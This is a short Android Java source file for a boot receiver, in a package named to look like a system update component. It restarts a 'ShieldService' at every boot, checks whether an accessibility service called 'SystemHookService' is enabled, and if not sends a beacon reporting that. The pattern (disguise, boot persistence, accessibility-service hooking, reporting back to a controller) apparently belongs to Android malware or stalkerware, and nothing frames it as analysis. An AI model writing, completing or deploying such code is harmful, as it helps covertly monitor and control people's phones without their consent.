package com.android.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())
                || "android.intent.action.QUICKBOOT_POWERON".equals(intent.getAction())) {
            context.startService(new Intent(context, ShieldService.class));
            if (!isAccessibilityEnabled(context)) {
                BeaconSender.send(context, "accessibility_disabled");
            }
        }
    }

    private boolean isAccessibilityEnabled(Context context) {
        String service = context.getPackageName() + "/" + SystemHookService.class.getCanonicalName();
        try {
            String enabled = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(service);
        } catch (Exception e) { return false; }
    }
}
